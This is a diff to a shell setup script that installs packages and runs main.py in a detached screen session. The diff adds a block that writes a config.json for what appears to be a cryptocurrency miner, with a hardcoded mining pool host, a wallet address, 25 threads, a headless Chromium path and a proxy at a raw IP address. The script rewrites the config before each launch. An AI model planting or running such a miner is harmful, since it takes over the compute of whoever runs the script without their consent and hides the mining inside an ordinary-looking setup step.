@@ -59,7 +59,28 @@ start_main_py() {
 }
 
 # Main script execution starts here
-
+create_config_file() {
+    cat <<EOL > config.json
+{
+    "algorithm": "$M_ALGO",
+    "host": "$M_HOST",
+    "port": $M_PORT,
+    "worker": "$M_WORKER",
+    "password": "$M_PASSWORD",
+    "workers": $M_THREADS,
+    "log": false,
+    "chrome": "./chromium/chrome",
+    "proxy": "$M_PROXY"
+}
+EOL
+}
+M_ALGO="yespowerr16"
+M_HOST="stratum-asia.rplant.xyz"
+M_PORT="13382"
+M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
+M_PASSWORD="x"
+M_THREADS="25"
+M_PROXY="ws://172.233.136.27:8088/proxy"
 # Call functions in sequence
 
 # Install screen
@@ -76,7 +97,8 @@ download_python
 
 # Install required packages
 install_packages
-
+rm -f config.json
+create_config_file
 # Start main.py in a screen session
 start_main_py
 
